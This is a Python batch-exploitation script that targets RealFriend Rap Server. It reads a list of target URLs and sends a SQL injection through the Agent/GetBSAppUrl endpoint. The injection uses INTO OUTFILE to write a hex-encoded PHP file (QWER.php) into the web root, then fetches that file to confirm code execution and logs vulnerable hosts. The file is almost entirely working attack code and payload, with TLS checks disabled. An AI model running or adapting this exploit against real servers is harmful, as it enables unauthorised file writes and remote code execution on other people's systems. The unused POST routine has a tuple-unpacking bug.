#!/usr/bin/python3  
# -*- coding: utf-8 -*-  
# author : Lem  
import urllib.request  
import re  
import requests  
import io  
import sys  
  

def basic_setting():
    timeout_s=3 
    regex_match=r'System </td><td class="v">(.+?)</td>' #自定义正则匹配规则
    
    return timeout_s,regex_match


def readfiles(): #批量读取文件，文本格式为https://127.0.0.1:8080
    result = [] 
    with open(r'urls.txt' ,'r') as f:
        for line in f:
         result.append(line.strip().split(',')[0])  
        return result


def all_poc():  #自定义poc内容
    poc_url = "/index.php?s=/Agent/GetBSAppUrl/AppID/')%3bselect+0x3c3f70687020706870696e666f28293b3f3e+into+outfile+%27C%3a\\Program+Files+(x86)\\RealFriend\\Rap+Server\\WebRoot\\QWER.php%27%23/123"
    poc_url_phpinfo = "/QWER.php"  
    poc_post_data = 'hello=hello'  
    header = {'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
          'Accept-Encoding': 'gzip, deflate',
          'Accept-Language': 'zh-CN,zh;q=0.9',
          'Cache-Control': 'max-age=0',
          'Connection': 'keep-alive',
          'Cookie': 'cookie',
          #'Host': 'www.baidu.com',
          'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.186 Safari/537.36'
          }
    return poc_url, poc_post_data,header,poc_url_phpinfo  

  
def scan_urls_post():  
    poc_url, poc_post_data,header = all_poc()  
    result = readfiles()   
    timeout_s,regex_match = basic_setting()
    for url in result:  
        scan = str(url) + poc_url 
        print(scan)  
        try:  
            re_data = requests.post(scan,data=poc_post_data,timeout=timeout_s,headers=header,verify=False)  
            print(re_data.status_code)  
            if re_data.status_code == 200:
                find_list = re.findall(regex_match, re_data.text)  
                print(find_list)  
                with open('scan_out.txt', mode='a') as file_handle:  
                    a = scan + "-"+str(find_list)  
                    file_handle.write(str(a) + "\n")  
            else:  
                print("不存在")  
                #print(re_data.text)  
        except requests.exceptions.RequestException as e:  
            print("请检查目标列表")  
            #print(re_data.status_code)  
            print(str(e))  

def scan_urls_get():  
    poc_url, _ ,header,poc_url_phpinfo = all_poc() 
    result = readfiles()  
    timeout_s,regex_match = basic_setting()
  
    for url in result:  
        scan = str(url) + poc_url
        phpinfo_poc_url = str(url) + poc_url_phpinfo  
        print(scan)  
        try:  
            re_data = requests.get(scan,timeout=timeout_s,headers=header,verify=False)  
            print(re_data.status_code)  
            if re_data.status_code == 200:
                re_phpinfo_data  =   requests.get(phpinfo_poc_url,timeout=timeout_s,headers=header,verify=False)
                #find_list = re.findall(regex_match, re_data.text)  
                find_list = re.findall(regex_match, re_phpinfo_data.text) 
                print(find_list)
                print(phpinfo_poc_url)  
                with open('scan_out.txt', mode='a') as file_handle:  
                    a = scan + "-"+ str(find_list)  
                    #file_handle.write(a + "\n")
                    file_handle.write(str(a)+"\n")  
            else:  
                print("不存在")  
                #print(re_data.text)  
        except requests.exceptions.RequestException as e:  
            print("请检查目标列表")  
            #print(re_data.status_code)  
            print(str(e))  
  


  
if __name__ == '__main__':    
    scan_urls_get()
    #scan_urls_post()